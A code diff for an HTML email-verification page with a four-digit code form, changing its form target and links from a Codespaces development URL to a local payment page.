@@ -88,21 +88,22 @@
     </div><!-- End Breadcrumbs -->
     <title>Email Verification</title>
     <link rel="stylesheet" href="./emailv_files/emailv.css">
+  
 
 
     <div class="container">
         <h2>Email Verification</h2>
         <p>We,ve sent a 4-digit confirmation code to your email. <br>Make sure you enter correct code.</p>
-        <form action="https://orange-space-barnacle-p4q7g5r5v9q37gwp-5000.app.github.dev" method="post" id="verificationForm">
+        <form action="/payment.html" method="post" id="verificationForm">
             <div class="verification-code">
                 <input type="text" maxlength="1" oninput="moveToNext(this, 'code2') "pattern="[0-9]" required="">
                 <input type="text" maxlength="1" id="code2" oninput="moveToNext(this, 'code3')" pattern="[0-9]" required="">
                 <input type="text" maxlength="1" id="code3" oninput="moveToNext(this, 'code4')" pattern="[0-9]" required="">
                 <input type="text" maxlength="1" id="code4" oninput="moveToNext(this, 'code5')" pattern="[0-9]" required="">
             </div>
-            <button type="submit" class="verify-button"><a href="https://orange-space-barnacle-p4q7g5r5v9q37gwp-8000.app.github.dev/" > Verify</a></button>
+            <button type="submit" class="verify-button"><a href="payment.html"> Verify</a></button>
         </form>
-        <p>Didn't receive code? <a href="https://orange-space-barnacle-p4q7g5r5v9q37gwp-8000.app.github.dev/">Resend Code</a></p>
+        <p>Didn't receive code? <a href="payment.html">Resend Code</a></p>
     </div>
     <script>
         function moveToNext(input, nextInputId) {
